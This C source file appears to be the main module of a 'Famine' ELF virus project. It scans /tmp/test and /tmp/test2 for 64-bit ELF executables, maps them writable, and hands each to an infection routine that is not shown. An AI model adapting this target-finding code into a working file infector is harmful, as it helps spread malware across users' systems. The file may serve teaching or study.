#include <famine.h>

static bool		header_check(void *ptr)
{
	Elf64_Ehdr *header;

	header = (Elf64_Ehdr *)ptr;
	if ((header->e_type == ET_EXEC || header->e_type == ET_DYN) &&
		header->e_ident[0] == ELFMAG0 && header->e_ident[1] == ELFMAG1 &&
		header->e_ident[2] == ELFMAG2 && header->e_ident[3] == ELFMAG3 &&
		header->e_ident[4] == ELFCLASS64)
			return (true);
	return (false);
}

static void			add_to_list(void *map_ptr, char *name, struct stat *s, t_list **head, int fd)
{
	t_list		*new;
	t_famine	*fam;
	t_list		*temp;
	
	if (!(new = (t_list*)malloc(sizeof(t_list))))
		exit(0);
	if (!(fam = (t_famine*)malloc(sizeof(t_famine))))
		exit(0);
	bzero(new, sizeof(*new));
	bzero(fam, sizeof(*fam));
	fam->ptr = map_ptr;
	fam->filename = strdup(name);
	fam->size = s->st_size;
	fam->fd = fd;
	temp = *head;
	new->content = (void*)fam;
	new->next = NULL;
	if (*head == NULL)
	{
		(*head) = new;
		return ;
	}
	else 
	{
		while (temp && temp->next != NULL)
			temp = temp->next;
		if (temp->next == NULL)
		{
			temp->next = new;
			temp->next->content = fam;
			temp->next->size = sizeof(fam);
			temp->next->next = NULL;
		}
	}
}

static void		*check_elf_64(char *path, char *name, t_list **head)
{
	int				len;
	struct stat		s;
	void			*ptr;

	len = strlen(path) + strlen(name) + 1;
	char	filename[len];
	strcpy(filename, path);
	strcat(filename, "/");
	strcat(filename, name);
	int fd = open(filename, O_RDWR);
	stat(filename, &s);
	if (S_ISREG(s.st_mode))
	{
		if ((ptr = mmap(0, s.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
			return (NULL);
		if (header_check(ptr))
			add_to_list(ptr, filename, &s, head, fd);
	}
	return (NULL);
}

void	print_list(t_list *head)
{

	t_list  *temp;
	temp = head;
	while (temp)
	{
		printf("%s\n", ((t_famine *)temp->content)->filename);
		temp = temp->next;
	}
}

void	get_files(t_list  **head)
{
	DIR				*d;
	struct dirent	*dir;
	
	d = opendir("/tmp/test");
	if (d)
	{
		while ((dir = readdir(d)) != NULL)
		{
			check_elf_64("/tmp/test",dir->d_name, head);
		}
	}
	closedir(d);
	d = opendir("/tmp/test2");
	if (d)
	{
		while ((dir = readdir(d)) != NULL)
			check_elf_64("/tmp/test2", dir->d_name, head);
	}
	closedir(d);
}

int		main(void)
{
	t_list			*head;
	t_list			*tmp;

	head = NULL;
	get_files(&head);
	tmp = head;
	while (tmp)
	{
		handle_elf64((t_famine *)tmp->content);
		tmp = tmp->next;
	}
}
